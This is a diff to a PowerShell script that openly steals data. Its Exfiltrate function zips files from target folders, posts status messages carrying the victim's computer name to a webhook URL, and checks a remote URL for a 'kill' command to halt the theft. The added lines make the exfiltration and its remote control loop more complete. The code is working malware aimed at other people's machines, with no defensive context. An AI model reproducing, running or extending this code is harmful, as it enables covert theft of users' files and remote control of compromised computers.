@@ -73,6 +73,9 @@ Invoke-RestMethod -Uri $hookurl -Method Post -ContentType "application/json" -Bo
 }
 
 Function Exfiltrate {
+$jsonsys = @{"username" = "$env:COMPUTERNAME" ;"content" = ":computer: ``Exfiltration Started`` :computer:"} | ConvertTo-Json
+Invoke-RestMethod -Uri $hookurl -Method Post -ContentType "application/json" -Body $jsonsys
+
 $maxZipFileSize = 25MB
 $currentZipSize = 0
 $index = 1
@@ -107,6 +110,13 @@ foreach ($folder in $foldersToSearch) {
             $entryName = $file.FullName.Substring($folder.Length + 1)
             [System.IO.Compression.ZipFileExtensions]::CreateEntryFromFile($zipArchive, $file.FullName, $entryName)
             $currentZipSize += $fileSize
+            $messages = Invoke-RestMethod -Uri $GHurl
+            if ($messages -match "kill") {
+                $jsonsys = @{"username" = "$env:COMPUTERNAME" ;"content" = ":computer: ``Exfiltration Stopped`` :octagonal_sign:"} | ConvertTo-Json
+                Invoke-RestMethod -Uri $hookurl -Method Post -ContentType "application/json" -Body $jsonsys
+                $previouscmd = $response
+                break
+            }
         }
     }
 }
